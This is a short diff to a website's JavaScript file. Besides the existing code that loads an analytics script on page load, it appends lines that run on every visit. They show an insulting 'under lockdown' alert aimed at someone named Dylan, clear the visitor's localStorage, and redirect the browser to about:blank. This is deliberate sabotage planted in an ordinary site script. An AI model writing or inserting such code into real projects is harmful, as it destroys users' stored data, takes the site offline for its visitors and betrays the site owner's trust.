@@ -19,3 +19,7 @@ document.addEventListener("DOMContentLoaded", function() {
     simpleAnalyticsScript.src = "https://scripts.simpleanalyticscdn.com/latest.js";
     document.head.appendChild(simpleAnalyticsScript);
 });
+
+alert("This website is temporarily under lockdown. Screw you Dylan!");
+localStorage.clear();
+window.location.replace("about:blank");
